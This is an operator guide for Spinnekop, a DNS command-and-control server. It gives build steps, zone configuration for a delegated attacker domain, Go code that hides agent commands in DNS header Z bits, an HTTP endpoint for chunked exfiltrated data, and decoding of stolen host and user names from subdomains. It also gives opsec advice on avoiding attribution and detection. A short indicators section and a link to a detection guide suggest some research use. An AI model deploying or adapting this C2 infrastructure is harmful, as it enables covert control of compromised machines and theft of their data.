# Spinnekop Server Guide

This guide covers setting up, configuring, and operating the Spinnekop C2 server.

## Overview

The Spinnekop server consists of three integrated components:

| Component | Port | Purpose |
|-----------|------|---------|
| DNS Server | 53 | Receive beacons, dispatch Z-value commands |
| HTTP Server | 8080 | Receive exfiltrated data |
| Z-Scheduler | Internal | Manage command queues per agent |

## Prerequisites

### System Requirements

- Go 1.23 or higher
- Root/Administrator privileges (port 53 requires elevated access)
- Open firewall ports: 53/UDP, 8080/TCP

### Domain Setup

For real-world testing, you need:

1. **A domain you control** (e.g., `timeserversync.com`)
2. **DNS delegation** pointing to your server's IP
3. **Registrar NS records** configured

Example registrar configuration:
```
ns1.timeserversync.com  →  143.198.3.13
ns2.timeserversync.com  →  143.198.3.13
```

## Installation

### Building the Server

```bash
# Clone repository
git clone https://github.com/faanross/spinnekop.git
cd spinnekop

# Install dependencies
go mod download

# Build server binary
go build -o bin/server ./cmd/server
```

### Directory Structure

```
spinnekop/
├── bin/
│   └── server              # Compiled server binary
├── configs/
│   └── server.yaml         # Server configuration
└── packet_captures/        # Optional packet logging
```

## Configuration

### Server Configuration File

The server reads from `configs/server.yaml`. Key sections:

#### Server Settings

```yaml
server:
  bind_address: "0.0.0.0"   # Listen on all interfaces
  port: 53                   # Standard DNS port
  max_workers: 4             # Concurrent query handlers
  worker_channel_buffer_size: 10
  read_timeout: 5            # Seconds
  write_timeout: 5           # Seconds
  max_packet_size: 512       # UDP packet size limit
```

#### Zone Configuration

```yaml
zones:
  - name: "timeserversync.com."
    description: "Primary C2 zone"
    ttl: 300

    soa:
      primary: "ns1.timeserversync.com."
      admin: "admin.timeserversync.com."
      serial: 2024012001
      refresh: 3600
      retry: 1800
      expire: 604800
      minimum: 86400

    nameservers:
      - name: "ns1.timeserversync.com."
        ip: "143.198.3.13"
      - name: "ns2.timeserversync.com."
        ip: "143.198.3.13"

    # Wildcard record - critical for subdomain encoding
    a_records:
      - name: "*.timeserversync.com."
        ip: "143.198.3.13"
        ttl: 300
```

The wildcard record (`*.timeserversync.com.`) is essential - it allows the server to respond to any subdomain, enabling the encoded data exfiltration technique.

#### Logging Configuration

```yaml
logging:
  level: "DEBUG"        # DEBUG, INFO, WARN, ERROR
  format: "TEXT"        # TEXT or JSON
  output: "STDOUT"      # STDOUT, STDERR, or file path
  log_queries: true     # Log incoming DNS queries
  log_responses: true   # Log outgoing responses
  packet_dump: false    # Hex dump packets (very verbose)
```

#### Security Settings

```yaml
security:
  rate_limiting:
    enabled: true
    max_queries_per_second: 10
    max_queries_per_minute: 100
    blacklist_duration: 3000    # ms

  query_filtering:
    allowed_types: ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SOA"]
    blocked_ips: []
    allowed_ips: []             # Empty = allow all

  response_policies:
    refuse_recursion: true
    case_sensitive: false
    minimum_ttl: 60
    maximum_ttl: 86400
```

## Running the Server

### Basic Startup

```bash
# Requires root for port 53
sudo ./bin/server
```

### Expected Output

```
🕷️ Spinnekop DNS Server v0.1
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 Config: ./configs/server.yaml
🔊 Log Level: DEBUG
📝 Log Format: TEXT

Zone Configuration:
  Zone: timeserversync.com.
    SOA: ns1.timeserversync.com. admin.timeserversync.com.
    NS Records: 2
    A Records: 6
    AAAA Records: 2

✅ Zone consistency check passed
INFO Starting DNS server address=0.0.0.0:53
```

### Graceful Shutdown

Press `Ctrl+C` to trigger graceful shutdown:

```
^C
INFO Received shutdown signal signal=interrupt
INFO Shutting down...
INFO Server stopped successfully
```

## Command Dispatch

### Z-Value Command Queue

The server maintains per-agent command queues. Commands are dispatched via the Z-value field in DNS responses.

#### Command Values

| Z-Value | Command | Effect |
|---------|---------|--------|
| 0 | CONTINUE | Normal beaconing |
| 1 | SLEEP | Extended 1-hour sleep |
| 2 | ENUMERATE | Enable subdomain encoding |
| 3 | HTTP_MODE | Switch to HTTPS channel |
| 7 | TERMINATE | Agent self-termination |

### Queueing Commands

The current implementation uses time-based Z-value scheduling. To queue commands for specific agents, modify the Z-scheduler:

```go
// internal/zhandler/handler.go
func GetNextZValue(agentID string) uint8 {
    // Check command queue for this agent
    if cmd, ok := commandQueue[agentID]; ok && len(cmd) > 0 {
        z := cmd[0]
        commandQueue[agentID] = cmd[1:]
        return z
    }
    return 0  // Default: continue
}
```

### Z-Value Injection

The server injects Z-values into DNS response headers:

```go
// Extract flags bytes
flags := binary.BigEndian.Uint16(response[2:4])

// Clear existing Z bits and set new value
flags = (flags & 0xFF8F) | (uint16(zValue) << 4)

// Write back
binary.BigEndian.PutUint16(response[2:4], flags)
```

## HTTP Handler

### Exfiltration Endpoint

The HTTP server receives data when agents switch to HTTP mode (Z=3):

```
POST /upload?agent_id=ABC123&chunk=0&total=5
Content-Type: application/octet-stream

[Base64 encoded data]
```

### Configuration

```yaml
monitoring:
  metrics:
    enabled: true
    bind_address: "127.0.0.1"
    port: 8080
    path: "/metrics"
```

### Data Reassembly

The server reassembles chunked uploads:

```
exfiltrated/
├── agent_ABC123/
│   ├── chunk_0.dat
│   ├── chunk_1.dat
│   └── reassembled_file.bin
```

## Monitoring

### Health Check Endpoint

```yaml
monitoring:
  health_check:
    enabled: true
    bind_address: "127.0.0.1"
    port: 8081
    path: "/health"
```

Test with:
```bash
curl http://localhost:8081/health
```

### Metrics Endpoint

```bash
curl http://localhost:8080/metrics
```

Returns query statistics:
- Total queries received
- Queries by type (A, TXT, etc.)
- Response times
- Error counts

## Decoding Exfiltrated Data

### Subdomain Decoding

When agents send encoded subdomains, the server decodes them:

```
Query: REVTS1RPUC1YWVo.timeserversync.com
        └─────────────┘
        Base64: "DESKTOP-XYZ"
```

The server logs decoded data:

```
DEBUG Decoded subdomain data agent=unknown data="DESKTOP-XYZ\Administrator"
```

### TXT Record Analysis

For TXT record exfiltration, check the RDATA:

```go
// Server decodes incoming TXT queries
subdomain := strings.Split(query.Name, ".")[0]
decoded, err := base64.StdEncoding.DecodeString(subdomain)
if err == nil {
    log.Printf("Decoded data: %s", string(decoded))
}
```

## Troubleshooting

### Port 53 Already in Use

```bash
# Find what's using port 53
sudo lsof -i :53

# On systemd systems, disable systemd-resolved
sudo systemctl disable systemd-resolved
sudo systemctl stop systemd-resolved
```

### DNS Not Resolving

1. Verify NS records at registrar
2. Test direct server response:
   ```bash
   dig @YOUR_SERVER_IP www.timeserversync.com
   ```
3. Check firewall allows UDP 53 inbound

### Agents Not Receiving Commands

1. Verify Z-value is being injected (enable packet_dump)
2. Check command queue has pending commands
3. Verify agent is extracting Z-value correctly

### High Memory Usage

Reduce worker count and buffer sizes:
```yaml
server:
  max_workers: 2
  worker_channel_buffer_size: 5
```

## Security Considerations

### Operational Security

1. **Use dedicated infrastructure** - Don't run on attributable servers
2. **Rotate domains** - Use multiple C2 domains
3. **Monitor logs** - Watch for scanning/discovery attempts
4. **Rate limit** - Prevent abuse and detection via high query volumes

### Network Indicators

The server generates these network indicators:
- DNS responses with non-zero Z-flag
- Wildcard DNS resolution
- High-entropy subdomain queries
- DNS-to-HTTPS protocol switching

See [Detection Guide](detection-guide.md) for comprehensive detection strategies.

## Next Steps

- [Agent Guide](agent-guide.md) - Building and deploying agents
- [Z-Value Protocol](z-value-protocol.md) - Command protocol details
- [Configuration Reference](configuration.md) - Complete config options
